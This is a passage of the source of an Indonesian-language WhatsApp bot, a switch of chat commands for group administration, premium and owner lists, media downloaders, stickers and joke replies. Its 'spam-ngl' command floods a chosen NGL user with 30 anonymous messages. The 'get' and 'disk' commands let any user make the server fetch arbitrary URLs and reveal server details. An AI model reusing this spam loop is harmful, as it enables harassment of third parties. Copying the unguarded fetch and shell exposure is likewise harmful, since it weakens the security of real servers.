      const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!', 'naik anjing aja, naik anjing']
      const ga = bisa[Math.floor(Math.random() * bisa.length)]
      reply(`pertanyaan : apakah ${q}\njawaban : ${ga}`)
  } 
  break

  case 'bagaimanakah': {
      if (isBan) return
      if (!q) return reply(`apaa njrr? contoh ${prefix + command} cara mengatasi sakit hati`)
      const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
      const ya = gimana[Math.floor(Math.random() * gimana.length)]
      reply(`pertanyaan : apakah ${q}\njawaban : ${ya}`)
  }
  break
                
  case 'antilink': {
      if (isBan) return	
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)		
      if (!isBotAdmins) return reply(mess.botdmin)
      if (!text) return reply(`silakan pilih opsinya, on/off, contoh ${prefix + command} on/off`)
      if (args[0] === "on") {
          if (global.db.data.chats[m.chat].antilink) return reply(`udaaa aktif`)
          global.db.data.chats[m.chat].antilink = true
          reply('successfully activate antilink in this group')
      } else if (args[0] === "off") {		
          if (!global.db.data[m.chat].antilink) return reply(`udah nonaktif`)
          global.db.data[m.chat].antilink = false
          reply('successfully disabling antilink in this group')
      }
  }
  break
          
 case 'tagme': {
     if (isBan) return
     if (!isGroup) return false;
     let menst = [m.sender];
     conn.sendMessage(m.chat, { 
         text: `@${m.sender.split('@')[0]}`,  
         mentions: menst        
     }
   )   
 }
 break
                
 case 'promote':
 case 'pm': {
     if (isBan) return
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return reply('tag/reply pesan target yang ingin di jadikan admin!')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`tag/reply target yang mau di ${command}`)
     await reaction(m.chat, "⚡")
     await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('sukses promote member')).catch((err) => reply('terjadi kesalahan'))
 }
 break
                
 case 'demote':
 case 'dm': {
     if (isBan) return
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('tag/reply pesan target yang ingin di un admin!')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`tag/reply target yang mau di ${command}`)
     await reaction(m.chat, "⚡")
     await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('sukses demote admin')).catch((err) => reply('terjadi kesalahan'))
 }
 break
                
case 'addprem': {
    if (isBan) return
    if (!Access) return reply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return reply(`mana nomornya dan mau berapa hari? contoh : ${prefix + command} @tag|30d`)
    if (!hari) return reply(`mau yang berapa hari njrr?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return reply('lol, owner kan bebas')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return reply('')
    let data = await conn.onWhatsApp(users)
    if (data[0].exists) {
        await reaction(m.chat, '')
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = `sukses status premium
- User : @${users.split("@")[0]}
- Expired : ${hari.toUpperCase()}
- Countdown : ${cekvip.days} hari, ${cekvip.hours} jam, ${cekvip.minutes} menit`
        const contentText = {
            text: teks,
            contextInfo: {	
                mentionedJid: conn.ments(teks),
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
                    sourceUrl: 'https://kyuurzy.tech'
                }	
            }	
        };	
        return conn.sendMessage(m.chat, contentText, { quoted: m })
    } else {		
         reply("not found")
    }	
}
break
                
case 'delprem': {
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (!args[0]) return reply(`siapa yang mau di ${command}? gunakan nomor/tag, contoh : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return reply("bukan user premium ini mah")
    let data = await conn.onWhatsApp(users)
    await reaction(m.chat, "⚡")
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        reply('user tersebut telah di hapus')
    } else {	
        reply("not found")
    }
}
break

case 'peler':
case 'anj':
case 'memek':
case 'mmk':
case 'ajg':
case 'annjingg':
case 'kntl':
case 'puki':
case 'yatim':
case 'ytim':
case 'bangsat':
case 'kontol':
case 'stress':
case 'kimak':{
    reply(`lu juga ${command}`)
}
break
                
case 'addowner': {
    if (isBan) return
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`mana nomornya? contoh ${prefix + command} 628888`);
    const prem1 = text.split("|")[0].replace(/[^0-9]/g, '');
    const cek1 = await conn.onWhatsApp(`${prem1}@s.whatsapp.net`);
    if (cek1.length == 0) return reply("masukkan nomor yang valid dan terdaftar di WhatsApp!")      
    kontributor.push(prem1);
    await reaction(m.chat, "⚡")
    fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor));
    reply(`sukses menjadikan ${prem1} sebagai owner`); 
    conn.sendMessage(`${prem1}@s.whatsapp.net`, { 
        text: `selamat, kamu sekarang bagian dari owner`},{quoted:m}
           );
        }
        break;

case 'delowner': {
    if (isBan) return
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`mana nomornya? contoh ${prefix + command} 628888`);
    const prem2 = text.split("|")[0].replace(/[^0-9]/g, '');
            const unp = kontributor.indexOf(prem2);
            if (unp !== -1) {
                kontributor.splice(unp, 1);
                await reaction(m.chat, "⚡")
                fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor));
                reply(`yah ${prem2} sudah bukan lagi bagian dari owner`);
            } else {
                reply(`${prem2} tidak ada dalam list owner.`);
            }
        }
        break;
            
        case 'public': {
            if (isBan) return
            if (!Access) return reply(mess.owner) 
            conn.public = true
            reply(`successfully changed to ${command}`)
        }
        break
            
        case 'self': {
            if (isBan) return
            if (!Access) return reply(mess.owner) 
            conn.public = false
            reply(`successfully changed to ${command}`)
        }
        break
            
case "jadibot": {
    if (isBan) return
    if (!Access && !isPremium) return reply('khusus user premium')
    await reaction(m.chat, '✅')
    try {
        await jadibot(conn, m, m.sender)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
                
case "stopjadibot": {
    if (isBan) return
    if (!Access && !isPremium) return reply('khusus user premium')
    await reaction(m.chat, '✅')
    if (m.key.fromMe) return
    try {
        await stopjadibot(conn, m, m.sender)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
			
case "listjadibot": {
    if (isBan) return
    if (!Access && !isPremium) return reply('khusus user premium')
    if (m.key.fromMe) return
    try {
        listjadibot(conn, m)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
                
case 'tqto': {
    if (isBan) return
    let peler = `
┏ͲᎻᎪΝᏦՏ Ͳϴ
┃Allah SWT
┃RansTech
┃Vampire
┃DeltaTech
┃KyyNev
┃Danzxd
┃Rilz
┃Petra Hosting
┃Kahfi
┃Osaka
┗━━━━━━━━━━━━
`
    conn.sendMessage(m.chat, {
        text: peler,
        footer: "©2025 - RansTech With Cecel",
        buttons: [       
            {
                buttonId: '.buyscrans',
                buttonText: {
                    displayText: 'buy sc' },
                type: 1,
            },
            {     
                buttonId: '.menu',
                buttonText: { displayText: 'back to menu' },
                type: 1,
            }
        ],
        headerType: 1,
        viewOnce: true,
    }, { quoted: m })
}
break    
        
case 'tourl': {
    if (isBan) return
    let q = m.quoted ? m.quoted : m
    let media = await quoted.download();
    await reaction(m.chat, "⚡")
    let uploadImage = require('./lib/uploadImage');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    const uploadFile = require('./lib/uploadFile')
    let link = await (isTele ? uploadImage : uploadFile)(media);  
    conn.sendMessage(m.chat, {
        text : `(no expiration date/unknown)\n ${link}`
    },{quoted:m})
}
break;       
            
case 'ping': {
    if (isBan) return
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    conn.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted:m})
}
break;
        
case 'speedtest': {
    if (isBan) return
    await reaction(m.chat, "⚡")
    const exec = promisify(cp.exec).bind(cp);
    let o;
    try {
        o = await exec('python3 speed.py --share --secure');
    } catch (e) {
        o = e;
    } finally {
        const { stdout, stderr } = o;
        if (stdout.trim()) {
            conn.relayMessage(m.chat, {
                extendedTextMessage: {
                    text: stdout,
                    contextInfo: {
                        externalAdReply: {
                            title: "S P E E D  T E S T",
                            mediaType: 1,
                            previewType: 0,
                            renderLargerThumbnail: true,
                            thumbnailUrl: cinahitam,
                            sourceUrl: `https://kyuurzy.tech`
                        }
                    },
                    mentions: [m.sender]
                }
            }, {quoted:m});
        }
        if (stderr.trim()) reply(stderr);
    }
}
break;

case 'disk': {
    if (isBan) return
    exec('cd && du -h --max-depth=1', (err, stdout) => {
        if (err) return reply(`${err}`);
        if (stdout) return reply(stdout);
    });
}
break;
            
case 'sticker':
case 's':
case 'stiker': {
    if (isBan) return
    if (!quoted) return reply(`reply image/video dengan caption ${prefix + command}`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            await reaction(m.chat, "⚡")
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, conn, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return reply('Durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(videoUrl, conn, m);
            } else {
                return reply('Kirim gambar/video dengan caption .s (video durasi 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return reply('Terjadi kesalahan saat memproses media. Coba lagi.');
        }
    }
    break;
            
      case'get':{
    if (isBan) return
        if (!/^https?:\/\//.test(text)) return reply(`mana url nya? contoh ${prefix + command} https://kyuurzy.site`);
        const ajg = await fetch(text);
          await reaction(m.chat, "⚡")
        if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
            throw `Content-Length: ${ajg.headers.get("content-length")}`;
        }

        const contentType = ajg.headers.get("content-type");
        if (contentType.startsWith("image/")) {
            return conn.sendMessage(
                m.chat,
                { image: { url: text } },
                { quoted: m }
            );
        }
        if (contentType.startsWith("video/")) {
            return conn.sendMessage(
                m.chat,
                { video: { url: text } },
                { quoted: m }
            );
        }
        if (contentType.startsWith("audio/")) {
            return conn.sendMessage(
                m.chat,
                { audio: { url: text },
                mimetype: 'audio/mpeg', 
                ptt: true
                },
                { quoted: m }
            );
        }
        
        let alak = await ajg.buffer();
        try {
            alak = util.format(JSON.parse(alak + ""));
        } catch (e) {
            alak = alak + "";
        } finally {
            return reply(alak.slice(0, 65536));
        }
      }
      break
        
      case 'open':
      case 'buka': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          conn.groupSettingUpdate(m.chat, 'not_announcement')
          reply(`sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
      }
      break
                
      case 'close':
      case 'tutup': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          conn.groupSettingUpdate(m.chat, 'announcement')
          reply(`sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
      }
      break
            
      case'totag':{
        if (isBan) return
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);
        if (!m.quoted) return reply(`reply pesan dengan caption ${prefix + command}`);
        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        conn.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id)
           }, { quoted: m });
         }
        break
            
    case 'igdl':
    case 'ig': {
        if (isBan) return;
        if (!text) return reply(`mana link instagram-nya? contoh: ${prefix + command} https://www.instagram.com/reel/DB8BGCZRKAh/?igsh=eDk1ajRncDV6Mjdh`);
    
        let memek = await igdl(text);
        await reaction(m.chat, "⚡");
    
        let respon = memek.data;
        if (respon && respon.length > 0) {
        
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
                for (let mediaUrl of uniqueUrls) {
                    const headResponse = await axios.head(mediaUrl);
                    const mimeType = headResponse.headers['content-type'];

                    const isImage = /image\/.*/.test(mimeType);
                    const isVideo = /video\/.*/.test(mimeType);

                    if (isImage) {
                        await conn.sendMessage(m.chat, {
                            image: { url: mediaUrl },
                            caption: "berhasil mendownload gambar dari URL."
                        }, { quoted: m });
                    } else if (isVideo || mimeType === 'application/octet-stream') {
                        await conn.sendMessage(m.chat, {
                            video: { url: mediaUrl },
                            caption: "berhasil mendownload video dari URL."
                        }, { quoted: m });
                    } else {
                        await conn.sendMessage(m.chat, {
                            text: `tipe media tidak didukung: ${mimeType}`
                        }, { quoted: m });
                    }
                }
            } catch (error) {
                console.error('Error fetching media type:', error);
                reply(error)
            }
        } else {
            await conn.sendMessage(m.chat, {
                text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, { quoted: m });
        }
    }
    break;
      
      case 'fb':
      case 'fbdl':
      case 'facebook':{
          if (isBan) return
          if (!text) return reply(`mana URL Facebook nya? contoh ${prefix + command} https://www.facebook.com/share/r/12BFZAtjpS8/?mibextid=qDwCgo`)
          let woii = await fetchJson(`https://api.siputzx.my.id/api/d/facebook?url=${text}`)
          await reaction(m.chat, "⚡")
          let hitam = woii.data;
          let peler = hitam.video;
          let anunya = hitam.userInfo.name
          conn.sendMessage(m.chat, { 
              video: { url: peler }, 
              caption: `source : ${anunya}` }, 
           { quoted: m }
         );
      }
      break
                
      case'ai':
      case'gemini':
      case'openai':
      case'chatgpt':{
        if (isBan) return
        if (!text) return reply(`mau tanyakan apa saja? contoh ${prefix + command} siapakah presiden Indonesia sekarang?`)
          let cuki = await fetchJson(`https://loco.web.id/wp-content/uploads/api/v1/bingai.php?q=${text}`)
          await reaction(m.chat, "⚡")
          let mamad = cuki.result.ai_response
          conn.sendMessage(m.chat, { text : mamad }, {quoted:m})
      }
      break
            
      case'tiktok':
      case'tt':{
        if (isBan) return
        if (!text) return reply(`mana link tiktok nya? contoh ${prefix + command} https://`);
         let res = await tiktok(text);
          await reaction(m.chat, "⚡")
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await conn.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await conn.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await conn.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await conn.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await conn.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await conn.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
            
      case'pindl':{
        if (isBan) return
        if (!text) return reply(`mana link pinterest nya? contoh ${prefix + command} https://pin.it/1DyLc8cGU`);
        let res = await pindl(text);
          await reaction(m.chat, "⚡")
        let mek = res.data.result;

        if (mek && mek.data) {
            const mediaUrl = mek.data;
            const isImage = mediaUrl.match(/\.(jpeg|jpg|png|gif)$/i);
            const isVideo = mediaUrl.match(/\.(mp4|webm|ogg)$/i);

            if (isImage) {
                await conn.sendMessage(m.chat, {
                    image: { url: mediaUrl },
                    caption: "Successfully downloaded photo using the Pinterest URL"
                }, { quoted: m });
            } else if (isVideo) {
                await conn.sendMessage(m.chat, {
                    video: { url: mediaUrl },
                    caption: "Successfully downloaded video using the Pinterest URL"
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, {
                    text: "Unsupported media type received."
                }, { quoted: m });
            }
        } else {
            await conn.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: m });
        }
      }
      break
            
      case'tagall':{
        if (isBan) return
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);

        const textMessage = args.join(" ") || "kosong";
        let teks = `pesan tagall :\n> *${textMessage}*\n\n`;

        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        for (let mem of participants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        conn.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
        }, { quoted: m });
      }
      break
            
      case'spam-ngl':{
        if (isBan) return
        if (!text) return reply(`berikan pesan dan username target, contoh ${prefix + command} kyuurzy|woii`)
        let peler = text.split("|")[0]
        let laso = text.split("|")[1]
        for (let j = 0; j < 30; j++) {
        await spamngl(peler, laso)
        }
          await reaction(m.chat, "⚡")
        conn.sendMessage(m.chat, {
            text: `sukses spam NGL ke ${peler} sebanyak 30x` 
          },{quoted:m})
      }
      break
            
        case'brat':{
            if (!isPremium && users.limit < 0) return reply(mess.limited); 
            users.limit -= 1;
            if (isBan) return
            if (!text) return reply(`mana text nya? contoh ${prefix + command} apanih cok`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "⚡")
            await makeStickerFromUrl(imageUrl, conn, m);
        }
       break
    
    case'play':{
        if(!text) return reply(`mau nyari lagu apa gblk? contoh ${prefix + command} wide awake`)
        try {
        const search = await yts(text);
        const telaso = search.all[0].url;
        const result = await fetchJson(`https://restapi.apibotwa.biz.id/api/ytmp3?url=${telaso}`);
        const puqii = result.result.download.url;
        await reaction(m.chat, '⚡');
        await conn.sendMessage(m.chat, {
            audio: { url: puqii },
            mimetype: 'audio/mpeg',
            fileName: 'Wide Awake.mp3',
            contextInfo: {
                forwardingScore: 100000,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: false,
                    containsAutoReply: true,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    title: result.result.metadata.title,
                    body: `song duration: ${result.result.metadata.timestamp}`,
                    previewType: "PHOTO",
                    thumbnailUrl: result.result.metadata.thumbnail,
                }
            }
        }, { quoted: m });
    } catch (error) {
        console.error('Error:', error);
        await conn.sendMessage(m.chat, { text: 'an error occurred while processing your request.' }, { quoted: m });
    }
    }
    break
                
      case 'delete':
      case 'd':
      case 'del': {
        if (isBan) return
	    if (!m.quoted) return reply('reply pesan yang mau di hapus')
          await conn.sendMessage(m.chat, {
              delete: {
                  remoteJid: m.chat,
                  id: m.quoted.id,
                  participant: m.quoted.sender
              }
          })
      }
	  break
                
      case 'q':
      case 'quoted': {
        if (isBan) return
          if (!m.quoted) return reply('reply pesannya!!')
          let gwm = await conn.serializeM(await m.getQuotedObj())
          if (!gwm.quoted) return reply('pesan yang anda reply tidak mengandung reply')
          await gwm.quoted.copyNForward(m.chat, true)
      }
      break

      case 'tovn': {
        if (isBan) return
        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`reply video/vn dengan caption ${prefix + command}`);
        if (!quoted) return reply(`Reply video/vn with caption ${prefix + command}`);
        await reaction(m.chat, "⚡")
        await sleep(5000);
        let media = await quoted.download();
        let { toAudio } = require('./lib/converter');
        let audio = await toAudio(media, 'mp4');
        conn.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
      }
        break;

    case 'jadian': {
        if (isBan) return;
        if (!m.isGroup) return reply(mess.group);
        conn.jadian = conn.jadian ? conn.jadian : {};
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        if (!text) return reply(`Tag/reply seseorang, contoh:\n${prefix + command} @628888`)
        if (users === m.sender) return reply("njirr, stress!");
        if (users === botNumber) return reply("njirr, sama bot? edan ");

        if (!global.db.data.users[users]) global.db.data.users[users] = { pacar: null };
        if (!global.db.data.users[m.sender]) global.db.data.users[m.sender] = { pacar: null };

        let pasangan = global.db.data.users[users].pacar;
        let pasangan2 = global.db.data.users[m.sender].pacar;

        if (pasangan2 === users) {
            reply(`itu kan pacar lu, njirr`);
        } else if (pasangan) {
            reply(`udaa ada pacarnya njirr!\n\nwoii @${pasangan.split("@")[0]}, ayangmu mau diambil`);
        } else if (pasangan2) {
            reply(`lakh, mau selingkuh?\n\nwoii @${pasangan2.split("@")[0]}, lihat nih, dia mau selingkuh`);
        } else {
                    let ktnmbk = [
                        "ada saat di mana aku nggak suka sendiri. tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.", "aku baru sadar ternyata selama ini kamu kaya! kaya yang aku cari selama ini. kamu mau nggak jadi pacarku?", "aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.", "aku boleh kirim cv ke kamu nggak? soalnya aku mau ngelamar jadi pacar.", "aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?", "aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. maukah kamu menerima cintaku?", "aku ingin bilang sesuatu. udah lama aku suka sama kamu, tapi aku nggak berani ngomong. jadi, kuputuskan untuk wa saja. aku pengin kamu jadi pacarku.", "aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. aku mencintaimu, maukah kamu menjadi pacarku?", "aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. maukah kau jadi pacarku?", "aku mau chat serius sama kamu. selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. kalau nggak keberatan, kamu mau jadi pacarku?", "aku melihatmu dan melihat sisa hidupku di depan mataku.", "aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.", "aku menyukaimu dari dulu. kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. akan sempurna jika kamu yang menjadi spesial di hati.", "aku naksir banget sama kamu. maukah kamu jadi milikku?", "aku nggak ada ngabarin kamu bukan karena aku nggak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. mungkin kamu akan kaget mendengarnya. selama ini aku menyukaimu.", "aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.", "aku nggak tahu sampai kapan usiaku berakhir. yang aku tahu, cintaku ini selamanya hanya untukmu.", "aku sangat menikmati waktu yang dihabiskan bersama hari ini. kita juga sudah lama saling mengenal. di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.", "aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. maukah kamu menjadi kekasihku?", "aku siapkan mental untuk hari ini. kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.", "aku tahu kita nggak seumur, tapi bolehkan aku seumur hidup sama kamu?", "aku tahu kita sudah lama sahabatan. tapi nggak salah kan kalau aku suka sama kamu? apa pun jawaban kamu aku terima. yang terpenting itu jujur dari hati aku yang terdalam.", "aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. jika kau mengerti akan kode ini maka kita akan bersama.", "aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.", "apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. karena berada di sampingmu, anugerah terindah bagiku. jadilah kekasihku, hey kamu.", "atas izin allah dan restu mama papa, kamu mau nggak jadi pacarku?", "bagaimana kalau kita jadi komplotan pencuri? aku mencuri hatimu dan kau mencuri hatiku.", "bahagia itu kalau aku dan kamu telah menjadi kita.", "besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. biar aku ada kerjaan buat selalu mikirin kamu.", "biarkan aku membuatmu bahagia selamanya. kamu hanya perlu melakukan satu hal: jatuh cinta denganku.", "biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!", "biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?", "bisakah kamu memberiku arahan ke hatimu? sepertinya aku telah kehilangan diriku di matamu.", "bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. dijawab ya.", "caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. aku mau kamu jadi milikku.", "cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.", "cintaku ke kamu tuh kayak angka 5 sampai 10. nggak ada duanya. aku mau kamu jadi satu-satunya wanita di hatiku.", "cowok mana yang berani-beraninya nyakitin kamu. sini aku obati, asal kamu mau jadi pacar aku.", "hai, kamu lagi ngapain? coba deh keluar rumah dan lihat bulan malam ini. cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?", "hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. senyummu menerangi hidupku dan semua kegelapan menghilang. maukah kamu menjadi milikku?", "ini bukan rayuan, tapi ini yang aku rasakan. aku ingin bertukar tulang denganmu. aku jadi tulang punggungmu, kamu jadi tulang rusukku. jadian yuk!", "ini cintaku, ambillah. ini jiwaku, gunakan itu. ini hatiku, jangan hancurkan. ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.", "izinkan aku mengatakan sesuatu yang menurutku sangat penting. hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. tetaplah di sana dan jadilah kekasihku. mau?", "jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. biarkan aku melakukannya sekarang.", "kalau aku matahari, kamu mau nggak jadi langitku? biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.", "kalau kamu membuka pesan ini, berarti kamu suka sama aku. kalau kamu membalas pesan ini, artinya kamu sayang sama aku. kalau kamu mengabaikan pesan ini, berarti kamu cinta sama aku. kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.", "kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.", "kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. aku ingin kamu selalu bersamaku. aku mencintaimu.", "kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.", "kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. maukah kamu jadi pacar aku?", "kamu kenal iwan nggak? iwan to be your boy friend.", "kamu mau nggak jadi matahari di kehidupanku? kalau mau, menjauhlah 149.6 juta km dari aku sekarang!", "kamu nggak capek hts-an sama aku? aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. kita pacaran aja, yuk?", "kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. iya, aku.", "kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. apakah kamu akan 